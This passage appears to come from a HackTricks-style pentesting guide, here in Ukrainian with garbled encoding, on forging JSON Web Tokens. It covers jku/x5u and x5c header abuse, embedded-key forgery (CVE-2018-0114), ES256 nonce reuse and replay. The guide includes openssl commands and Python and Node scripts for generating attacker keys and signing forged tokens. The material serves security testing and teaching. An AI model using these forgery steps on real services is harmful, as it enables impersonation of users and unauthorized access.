–¢–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, [**jwt.io**](https://jwt.io), —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π JWT –∑ **—Å—Ç–≤–æ—Ä–µ–Ω–∏–º–∏ –ø—É–±–ª—ñ—á–Ω–∏–º–∏ —Ç–∞ –ø—Ä–∏–≤–∞—Ç–Ω–∏–º–∏ –∫–ª—é—á–∞–º–∏ —Ç–∞ –≤–∫–∞–∑—É—é—á–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä jku –Ω–∞ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç.** –©–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –¥—ñ–π—Å–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç jku, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π —ñ –∑–º—ñ–Ω–∏—Ç–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏.

–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ "e" —Ç–∞ "n" –∑ –ø—É–±–ª—ñ—á–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. URI, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–∞–±—ñ—Ä –ø—É–±–ª—ñ—á–Ω–∏—Ö —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ X.509 (—Å—Ç–∞–Ω–¥–∞—Ä—Ç —Ñ–æ—Ä–º–∞—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞), –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏—Ö —É —Ñ–æ—Ä–º—ñ PEM. –ü–µ—Ä—à–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —É –Ω–∞–±–æ—Ä—ñ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ —Ç–∏–º, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—ñ–¥–ø–∏—Å–∞–Ω–Ω—è —Ü—å–æ–≥–æ JWT. –ù–∞—Å—Ç—É–ø–Ω—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –∫–æ–∂–µ–Ω –ø—ñ–¥–ø–∏—Å—É—î –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –∑–∞–≤–µ—Ä—à—É—é—á–∏ –ª–∞–Ω—Ü—é–≥ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤. X.509 –≤–∏–∑–Ω–∞—á–µ–Ω–æ –≤ RFC 52807. –î–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –ø–æ—Ç—Ä—ñ–±–Ω–∞ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç–Ω–∞ –±–µ–∑–ø–µ–∫–∞.

–°–ø—Ä–æ–±—É–π—Ç–µ **–∑–º—ñ–Ω–∏—Ç–∏ —Ü–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –Ω–∞ URL –ø—ñ–¥ –≤–∞—à–∏–º –∫–æ–Ω—Ç—Ä–æ–ª–µ–º** —ñ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –±—É–¥–µ –æ—Ç—Ä–∏–º–∞–Ω–æ –±—É–¥—å-—è–∫–∏–π –∑–∞–ø–∏—Ç. –£ —Ç–∞–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ **–º–æ–∂–µ—Ç–µ –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ JWT**.

–©–æ–± –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ –Ω–æ–≤–∏–π —Ç–æ–∫–µ–Ω, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –≤–∞–º–∏, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —ñ –≤–∏—Ç—è–≥—Ç–∏ –ø—É–±–ª—ñ—á–Ω—ñ —Ç–∞ –ø—Ä–∏–≤–∞—Ç–Ω—ñ –∫–ª—é—á—ñ:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
–¢–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, [**jwt.io**](https://jwt.io), —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π JWT –∑ **—Å—Ç–≤–æ—Ä–µ–Ω–∏–º–∏ –ø—É–±–ª—ñ—á–Ω–∏–º–∏ —Ç–∞ –ø—Ä–∏–≤–∞—Ç–Ω–∏–º–∏ –∫–ª—é—á–∞–º–∏ —Ç–∞ –≤–∫–∞–∑–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä x5u –Ω–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç .crt, —â–æ –±—É–≤ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π.**

![](<../.gitbook/assets/image (956).png>)

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –æ–±–æ–º–∞ —Ü–∏–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏ **–¥–ª—è SSRFs**.

#### x5c

–¶–µ–π –ø–∞—Ä–∞–º–µ—Ç—Ä –º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏ **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —É base64**:

![](<../.gitbook/assets/image (1119).png>)

–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ **–≥–µ–Ω–µ—Ä—É—î —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç** —ñ —Å—Ç–≤–æ—Ä—é—î –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–∏–π —Ç–æ–∫–µ–Ω, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á, —ñ –∑–∞–º—ñ–Ω—é—î –∑–Ω–∞—á–µ–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ "x5c" –Ω–∞ –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —Ç–∞ –º–æ–¥–∏—Ñ—ñ–∫—É—î —ñ–Ω—à—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏, –∞ —Å–∞–º–µ n, e —Ç–∞ x5t, —Ç–æ–¥—ñ, –ø–æ —Å—É—Ç—ñ, –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–∏–π —Ç–æ–∫–µ–Ω –±—É–¥–µ –ø—Ä–∏–π–Ω—è—Ç–∏–π —Å–µ—Ä–≤–µ—Ä–æ–º.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### –í–±—É–¥–æ–≤–∞–Ω–∏–π –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –∫–ª—é—á (CVE-2018-0114)

–Ø–∫—â–æ JWT –≤–±—É–¥—É–≤–∞–≤ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –∫–ª—é—á, —è–∫ —É –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó:

![](<../.gitbook/assets/image (624).png>)

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç nodejs, –º–æ–∂–Ω–∞ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –∫–ª—é—á –∑ —Ü–∏—Ö –¥–∞–Ω–∏—Ö:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
–ú–æ–∂–ª–∏–≤–æ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –Ω–æ–≤–∏–π –ø—Ä–∏–≤–∞—Ç–Ω–∏–π/–ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á, –≤–±—É–¥—É–≤–∞—Ç–∏ –Ω–æ–≤–∏–π –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á –≤—Å–µ—Ä–µ–¥–∏–Ω—É —Ç–æ–∫–µ–Ω–∞ —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –Ω–æ–≤–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ "n" —Ç–∞ "e", –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ–π —Å–∫—Ä–∏–ø—Ç nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
–ù–∞—Ä–µ—à—Ç—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—É–±–ª—ñ—á–Ω–∏–π —Ç–∞ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á—ñ, –∞ —Ç–∞–∫–æ–∂ –Ω–æ–≤—ñ –∑–Ω–∞—á–µ–Ω–Ω—è "n" —Ç–∞ "e", –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [jwt.io](https://jwt.io) –¥–ª—è –ø—ñ–¥—Ä–æ–±–∫–∏ –Ω–æ–≤–æ–≥–æ –¥—ñ–π—Å–Ω–æ–≥–æ JWT –∑ –±—É–¥—å-—è–∫–æ—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é.

### ES256: –í–∏—è–≤–ª–µ–Ω–Ω—è –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ –∑ –æ–¥–Ω–∞–∫–æ–≤–∏–º nonce

–Ø–∫—â–æ –¥–µ—è–∫—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å ES256 —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –æ–¥–Ω–∞–∫–æ–≤–∏–π nonce –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –¥–≤–æ—Ö jwt, –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –º–æ–∂–µ –±—É—Ç–∏ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–∏–π.

–û—Å—å –ø—Ä–∏–∫–ª–∞–¥: [ECDSA: –í–∏—è–≤–ª–µ–Ω–Ω—è –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞, —è–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –æ–¥–Ω–∞–∫–æ–≤–∏–π nonce (–∑ SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

–ó–∞—è–≤–∞ JTI (JWT ID) –Ω–∞–¥–∞—î —É–Ω—ñ–∫–∞–ª—å–Ω–∏–π —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –¥–ª—è —Ç–æ–∫–µ–Ω–∞ JWT. –ô–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é —Ç–æ–∫–µ–Ω–∞.\
–û–¥–Ω–∞–∫ —É—è–≤—ñ—Ç—å —Å–∏—Ç—É–∞—Ü—ñ—é, –∫–æ–ª–∏ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞ –¥–æ–≤–∂–∏–Ω–∞ ID —Å—Ç–∞–Ω–æ–≤–∏—Ç—å 4 (0001-9999). –ó–∞–ø–∏—Ç–∏ 0001 —Ç–∞ 10001 –±—É–¥—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–¥–Ω–∞–∫–æ–≤–∏–π ID. –¢–æ–º—É, —è–∫—â–æ –±–µ–∫–µ–Ω–¥ –∑–±—ñ–ª—å—à—É—î ID –∑ –∫–æ–∂–Ω–∏–º –∑–∞–ø–∏—Ç–æ–º, –≤–∏ –º–æ–≥–ª–∏ –± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º, —â–æ–± **–ø–æ–≤—Ç–æ—Ä–∏—Ç–∏ –∑–∞–ø–∏—Ç** (–ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ 10000 –∑–∞–ø–∏—Ç—ñ–≤ –º—ñ–∂ –∫–æ–∂–Ω–∏–º —É—Å–ø—ñ—à–Ω–∏–º –ø–æ–≤—Ç–æ—Ä–æ–º).

### –ó–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω—ñ –∑–∞—è–≤–∏ JWT

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### –Ü–Ω—à—ñ –∞—Ç–∞–∫–∏

**–ê—Ç–∞–∫–∏ –ø–µ—Ä–µ—Ö—Ä–µ—Å–Ω–æ–≥–æ —Ä–µ–ª–µ**

–ë—É–ª–æ –ø–æ–º—ñ—á–µ–Ω–æ, —â–æ –¥–µ—è–∫—ñ –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∏ –ø–æ–∫–ª–∞–¥–∞—é—Ç—å—Å—è –Ω–∞ –Ω–∞–¥—ñ–π–Ω–∏–π —Å–µ—Ä–≤—ñ—Å JWT –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —Ç–∞ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Å–≤–æ—ó–º–∏ —Ç–æ–∫–µ–Ω–∞–º–∏. –ó–∞—Ñ—ñ–∫—Å–æ–≤–∞–Ω–æ –≤–∏–ø–∞–¥–∫–∏, –∫–æ–ª–∏ —Ç–æ–∫–µ–Ω, –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π –¥–ª—è –æ–¥–Ω–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞ —Å–µ—Ä–≤—ñ—Å–æ–º JWT, –±—É–≤ –ø—Ä–∏–π–Ω—è—Ç–∏–π —ñ–Ω—à–∏–º –∫–ª—ñ—î–Ω—Ç–æ–º —Ç–æ–≥–æ –∂ —Å–µ—Ä–≤—ñ—Å—É JWT. –Ø–∫—â–æ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤–∏–¥–∞—á–∞ –∞–±–æ –ø–æ–Ω–æ–≤–ª–µ–Ω–Ω—è JWT —á–µ—Ä–µ–∑ —Å—Ç–æ—Ä–æ–Ω–Ω—ñ–π —Å–µ—Ä–≤—ñ—Å, —Å–ª—ñ–¥ –¥–æ—Å–ª—ñ–¥–∏—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –Ω–∞ —ñ–Ω—à–æ–º—É –∫–ª—ñ—î–Ω—Ç—ñ —Ü—å–æ–≥–æ —Å–µ—Ä–≤—ñ—Å—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–µ —Å–∞–º–µ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞/–µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É. –ü–æ—Ç—ñ–º —Å–ª—ñ–¥ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–∏ –æ—Ç—Ä–∏–º–∞–Ω–∏–π —Ç–æ–∫–µ–Ω —É –∑–∞–ø–∏—Ç—ñ –¥–æ —Ü—ñ–ª—ñ, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –±—É–¥–µ –≤—ñ–Ω –ø—Ä–∏–π–Ω—è—Ç–∏–π.

* –ö—Ä–∏—Ç–∏—á–Ω–∞ –ø—Ä–æ–±–ª–µ–º–∞ –º–æ–∂–µ –±—É—Ç–∏ –≤–∫–∞–∑–∞–Ω–∞ –ø—Ä–∏–π–Ω—è—Ç—Ç—è–º –≤–∞—à–æ–≥–æ —Ç–æ–∫–µ–Ω–∞, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –¥–æ–∑–≤–æ–ª—è—î –ø—ñ–¥—Ä–æ–±–∫—É –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –û–¥–Ω–∞–∫ —Å–ª—ñ–¥ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –¥–ª—è –±—ñ–ª—å—à —à–∏—Ä–æ–∫–æ–≥–æ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –º–æ–∂–µ –∑–Ω–∞–¥–æ–±–∏—Ç–∏—Å—è –¥–æ–∑–≤—ñ–ª, —è–∫—â–æ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—è –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–Ω—å–æ–º—É –¥–æ–¥–∞—Ç–∫—É, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –º–æ–∂–µ –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤ —é—Ä–∏–¥–∏—á–Ω—É —Å—ñ—Ä—É –∑–æ–Ω—É.

**–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ç–µ—Ä–º—ñ–Ω—É –¥—ñ—ó —Ç–æ–∫–µ–Ω—ñ–≤**

–¢–µ—Ä–º—ñ–Ω –¥—ñ—ó —Ç–æ–∫–µ–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞—è–≤–∏ "exp" Payload. –û—Å–∫—ñ–ª—å–∫–∏ JWT —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –±–µ–∑ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Å–µ—Å—ñ—é, –ø–æ—Ç—Ä—ñ–±–Ω–∞ –æ–±–µ—Ä–µ–∂–Ω–∞ –æ–±—Ä–æ–±–∫–∞. –£ –±–∞–≥–∞—Ç—å–æ—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –ø–æ–≤—Ç–æ—Ä–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è JWT —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∏–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –∑–∞ —Ü—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. RFC JWT —Ä–µ–∫–æ–º–µ–Ω–¥—É—î –ø–æ–º'—è–∫—à—É–≤–∞—Ç–∏ –∞—Ç–∞–∫–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è JWT, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∑–∞—è–≤—É "exp" –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —á–∞—Å—É –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è –¥—ñ—ó —Ç–æ–∫–µ–Ω–∞. –ö—Ä—ñ–º —Ç–æ–≥–æ, —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ –¥–æ–¥–∞—Ç–∫–æ–º –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –æ–±—Ä–æ–±–∫–∏ —Ü—å–æ–≥–æ –∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∞ –≤—ñ–¥—Ö–∏–ª–µ–Ω–Ω—è –ø—Ä–æ—Å—Ç—Ä–æ—á–µ–Ω–∏—Ö —Ç–æ–∫–µ–Ω—ñ–≤ —î –∫—Ä–∏—Ç–∏—á–Ω–æ –≤–∞–∂–ª–∏–≤–æ—é. –Ø–∫—â–æ —Ç–æ–∫–µ–Ω –º—ñ—Å—Ç–∏—Ç—å –∑–∞—è–≤—É "exp" —ñ –æ–±–º–µ–∂–µ–Ω–Ω—è —á–∞—Å—É —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—é—Ç—å, —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ —Ç–æ–∫–µ–Ω —ñ –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –ø—ñ—Å–ª—è –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è —Ç–µ—Ä–º—ñ–Ω—É –¥—ñ—ó. –í–º—ñ—Å—Ç —Ç–æ–∫–µ–Ω–∞, –≤–∫–ª—é—á–∞—é—á–∏ –ø–∞—Ä—Å–∏–Ω–≥ –º—ñ—Ç–∫–∏ —á–∞—Å—É —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É —Ç–µ—Ä–º—ñ–Ω—É –¥—ñ—ó (–º—ñ—Ç–∫–∞ —á–∞—Å—É –≤ UTC), –º–æ–∂–Ω–∞ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–∞–ø–æ—Ä–∞ -R —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ jwt_tool.

* –Ü—Å–Ω—É—î —Ä–∏–∑–∏–∫ –±–µ–∑–ø–µ–∫–∏, —è–∫—â–æ –¥–æ–¥–∞—Ç–æ–∫ –≤—Å–µ —â–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î —Ç–æ–∫–µ–Ω, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –º–æ–∂–µ –æ–∑–Ω–∞—á–∞—Ç–∏, —â–æ —Ç–æ–∫–µ–Ω –Ω—ñ–∫–æ–ª–∏ –Ω–µ –º–æ–∂–µ –∑–∞–∫—ñ–Ω—á–∏—Ç–∏—Å—è.

### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

–Ø–∫—â–æ –≤–∞—Å —Ü—ñ–∫–∞–≤–∏—Ç—å **–∫–∞—Ä'—î—Ä–∞ –≤ —Ö–∞–∫–µ—Ä—Å—Ç–≤—ñ** —ñ –≤–∏ —Ö–æ—á–µ—Ç–µ –∑–ª–∞–º–∞—Ç–∏ –Ω–µ–∑–ª–∞–º–Ω–µ - **–º–∏ –Ω–∞–π–º–∞—î–º–æ!** (_–≤–∏–º–∞–≥–∞—î—Ç—å—Å—è –≤—ñ–ª—å–Ω–µ –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –ø–æ–ª—å—Å—å–∫–æ—é –º–æ–≤–æ—é –≤ –ø–∏—Å—å–º–æ–≤—ñ–π —Ç–∞ —É—Å–Ω—ñ–π —Ñ–æ—Ä–º—ñ_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
